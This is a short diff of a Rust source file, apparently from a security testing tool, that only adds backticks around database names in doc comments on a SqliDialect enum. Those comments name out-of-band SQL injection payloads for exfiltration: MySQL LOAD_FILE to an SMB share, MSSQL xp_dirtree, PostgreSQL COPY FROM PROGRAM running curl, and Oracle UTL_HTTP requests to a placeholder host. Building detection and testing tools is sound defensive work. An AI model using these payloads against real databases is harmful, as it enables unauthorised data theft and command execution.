@@ -117,11 +117,11 @@ fn with_scheme(url: &str, new_scheme: &str) -> String {
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 #[non_exhaustive]
 pub enum SqliDialect {
-    /// MySQL / MariaDB: `LOAD_FILE('\\\\host\\share')` SMB exfil.
+    /// `MySQL` / `MariaDB`: `LOAD_FILE('\\\\host\\share')` SMB exfil.
     MySql,
     /// MSSQL: `xp_dirtree '\\\\host\\share'` UNC path resolution.
     MsSql,
-    /// PostgreSQL: `COPY ... FROM PROGRAM 'curl URL'`.
+    /// `PostgreSQL`: `COPY ... FROM PROGRAM 'curl URL'`.
     Postgres,
     /// Oracle: `UTL_HTTP.request('http://host/')`.
     Oracle,
